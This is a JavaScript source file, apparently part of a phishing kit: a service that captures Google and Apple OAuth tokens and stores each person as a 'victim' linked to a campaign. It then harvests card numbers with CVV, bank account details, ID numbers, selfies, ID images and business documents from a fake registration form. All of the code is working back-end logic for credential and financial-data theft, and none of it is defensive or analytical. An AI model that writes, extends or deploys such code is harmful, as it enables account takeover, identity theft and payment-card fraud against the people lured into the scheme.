// OAuth token capture service
// Handles capturing and storing OAuth tokens from Google/Apple

class CredentialCaptureService {
  constructor(oauthTokenRepository, victimRepository, encryptionService) {
    this.oauthTokenRepository = oauthTokenRepository;
    this.victimRepository = victimRepository;
    this.encryptionService = encryptionService;
  }

  /**
   * Capture OAuth token from provider
   * @param {Object} tokenData - Raw OAuth token data
   * @param {string} provider - Provider name (google, apple)
   * @param {Object} metadata - Additional metadata
   * @returns {Promise<Object>} - Created victim and token records
   */
  async captureOAuthToken(tokenData, provider, metadata = {}) {
    const {
      access_token,
      refresh_token,
      id_token,
      expires_in,
      token_type = 'Bearer',
      scope,
      user_info = {}
    } = tokenData;

    // Extract email from token data or user_info
    const email = user_info.email || tokenData.email || metadata.email;
    if (!email) {
      throw new Error('Email is required for OAuth token capture');
    }

    // Check if victim already exists
    let victim = await this.victimRepository.findByEmail(email);
    
    if (!victim) {
      // Create new victim record
      const captureMethod = provider === 'google' ? 'oauth_google' : 
                           provider === 'apple' ? 'oauth_apple' : 
                           'oauth_unknown';
      
      victim = await this.victimRepository.create({
        email,
        name: user_info.name || user_info.displayName || null,
        phone: user_info.phone || null,
        captureMethod,
        captureSource: metadata.captureSource || null,
        campaignId: metadata.campaignId || null,
        sessionData: metadata.sessionData || {},
        deviceFingerprint: metadata.deviceFingerprint || {},
        validation: {
          emailVerified: user_info.emailVerified || false,
          provider: provider
        }
      });
    } else {
      // Update existing victim with new capture data
      await this.victimRepository.update(victim.id, {
        name: user_info.name || user_info.displayName || victim.name,
        phone: user_info.phone || victim.phone,
        deviceFingerprint: {
          ...victim.deviceFingerprint,
          ...(metadata.deviceFingerprint || {})
        },
        sessionData: {
          ...victim.sessionData,
          ...(metadata.sessionData || {})
        }
      });
    }

    // Encrypt token data
    const encryptedTokenData = this.encryptionService.encrypt({
      access_token,
      refresh_token,
      id_token,
      token_type,
      scope
    });

    // Calculate expiration time
    const expiresIn = expires_in || 3600; // Default 1 hour
    const expiresAt = new Date(Date.now() + expiresIn * 1000);

    // Create OAuth token record
    const oauthToken = await this.oauthTokenRepository.create({
      victimId: victim.id,
      provider,
      providerMetadata: {
        scope,
        token_type,
        ...metadata.providerMetadata
      },
      tokenData: encryptedTokenData,
      issuedAt: new Date(),
      expiresAt,
      tokenStatus: 'active',
      userProfile: {
        email: user_info.email || email,
        name: user_info.name || user_info.displayName,
        picture: user_info.picture || user_info.photoURL,
        ...user_info
      }
    });

    return {
      victim,
      oauthToken
    };
  }

  /**
   * Process registration form data
   * @param {string} victimId - Victim ID
   * @param {Object} formData - Registration form data
   * @param {Object} files - Uploaded files
   * @returns {Promise<Object>} - Updated victim record
   */
  async processRegistrationForm(victimId, formData, files = {}) {
    const victim = await this.victimRepository.findById(victimId);
    if (!victim) {
      throw new Error('Victim not found');
    }
    const existingValidation = victim.validation || {};

    // Encrypt card information if provided
    const cardFields = {
      cardNumber: formData.cardNumber || formData.card_number,
      cardHolderName: formData.cardHolderName || formData.card_holder_name,
      expiryDate: formData.cardExpiry || formData.expiryDate,
      cvv: formData.cardCVV || formData.cvv
    };
    const hasCardData = Object.values(cardFields).some(Boolean);
    let cardInformation = victim.cardInformation || {};

    if (hasCardData) {
      const encryptedCardInfo = this.encryptionService.encrypt(cardFields);
      cardInformation = {
        cardType: formData.cardType || formData.card_type || cardInformation.cardType || null,
        ...encryptedCardInfo
      };
    }

    const existingIdentity = victim.identityVerification || {};
    const cardImage = files.card_image || files.identityCard || existingIdentity.cardImage || null;
    const transactionHistoryFiles = (files.transaction_history && files.transaction_history.length > 0)
      ? files.transaction_history
      : (existingIdentity.transactionHistoryFiles || []);

    const businessLocationPhotos = (files.business_location_photos && files.business_location_photos.length > 0)
      ? files.business_location_photos
      : (existingIdentity.documents?.businessLocationPhotos || []);

    const documents = {
      ...(existingIdentity.documents || {})
    };
    if (files.business_license_file) {
      documents.businessLicenseFile = files.business_license_file;
    }
    if (files.representative_id_file) {
      documents.representativeIdFile = files.representative_id_file;
    }
    if (businessLocationPhotos.length > 0) {
      documents.businessLocationPhotos = businessLocationPhotos;
    }

    const businessProfile = {
      type: formData.businessType,
      name: formData.businessName,
      industry: formData.industry,
      taxCode: formData.taxCode,
      licenseNumber: formData.businessLicense,
      address: formData.businessAddress,
      phone: formData.businessPhone,
      email: formData.businessEmail,
      website: formData.website,
      documents: {
        businessLicenseFile: documents.businessLicenseFile,
        businessLocationPhotos: documents.businessLocationPhotos
      }
    };

    const representativeProfile = {
      name: formData.representativeName || formData.fullName,
      phone: formData.representativePhone || formData.phone,
      email: formData.representativeEmail || formData.email,
      idNumber: formData.representativeIdNumber || formData.idNumber,
      position: formData.representativePosition,
      documents: {
        idFile: documents.representativeIdFile
      }
    };

    const bankingProfile = {
      bankName: formData.bankName,
      accountNumber: formData.bankAccountNumber,
      accountName: formData.bankAccountName,
      branch: formData.bankBranch,
      transactionHistoryFiles
    };

    const identityFiles = {
      ...(existingIdentity.files || {})
    };
    if (cardImage) {
      const cardImagePath = cardImage.path || cardImage;
      identityFiles.card_image = cardImagePath;
      identityFiles.identityCard = identityFiles.identityCard || cardImagePath;
    }
    if (files.selfie) {
      identityFiles.selfie = files.selfie.path;
    }
    if (transactionHistoryFiles.length > 0) {
      const transactionPaths = transactionHistoryFiles.map(file => file.path || file);
      identityFiles.transaction_history = transactionPaths;
      identityFiles.bankStatement = identityFiles.bankStatement || transactionPaths;
    }
    if (files.business_license_file) {
      identityFiles.business_license_file = files.business_license_file.path;
    }
    if (files.representative_id_file) {
      identityFiles.representative_id_file = files.representative_id_file.path;
    }
    if (files.business_location_photos && files.business_location_photos.length > 0) {
      identityFiles.business_location_photos = files.business_location_photos.map(file => file.path || file);
    }

    // Prepare identity verification data
    const identityVerification = {
      ...existingIdentity,
      fullName: representativeProfile.name || formData.businessName || victim.name,
      phone: representativeProfile.phone || formData.businessPhone || victim.phone,
      address: businessProfile.address || existingIdentity.address,
      city: formData.city || existingIdentity.city,
      district: formData.district || existingIdentity.district,
      bankName: bankingProfile.bankName || existingIdentity.bankName,
      bankAccount: bankingProfile.accountNumber || existingIdentity.bankAccount,
      idNumber: representativeProfile.idNumber || existingIdentity.idNumber,
      businessProfile,
      representative: representativeProfile,
      banking: bankingProfile,
      cardImage,
      transactionHistoryFiles,
      documents,
      files: identityFiles,
      formSnapshot: {
        businessType: formData.businessType,
        businessName: formData.businessName,
        industry: formData.industry,
        taxCode: formData.taxCode,
        businessLicense: formData.businessLicense,
        businessAddress: formData.businessAddress,
        businessPhone: formData.businessPhone,
        businessEmail: formData.businessEmail,
        website: formData.website,
        representativeName: representativeProfile.name,
        representativePhone: representativeProfile.phone,
        representativeEmail: representativeProfile.email,
        representativeIdNumber: representativeProfile.idNumber,
        representativePosition: representativeProfile.position,
        bankName: bankingProfile.bankName,
        bankAccountNumber: bankingProfile.accountNumber,
        bankAccountName: bankingProfile.accountName,
        bankBranch: bankingProfile.branch,
        cardType: cardInformation.cardType || formData.cardType,
        cardProvided: hasCardData,
        acceptTerms: formData.acceptTerms === true,
        city: formData.city,
        district: formData.district,
        submittedAt: new Date().toISOString()
      },
      verificationStatus: 'pending',
      verificationTimestamp: new Date().toISOString()
    };

    // Update victim record
    const updatedVictim = await this.victimRepository.update(victimId, {
      name: representativeProfile.name || victim.name || businessProfile.name,
      phone: representativeProfile.phone || businessProfile.phone || victim.phone,
      cardInformation,
      identityVerification,
      validation: {
        ...existingValidation,
        registrationCompleted: true,
        registrationTimestamp: new Date().toISOString(),
        account_type: formData.businessType || existingValidation.account_type
      }
    });

    return updatedVictim;
  }
}

module.exports = CredentialCaptureService;
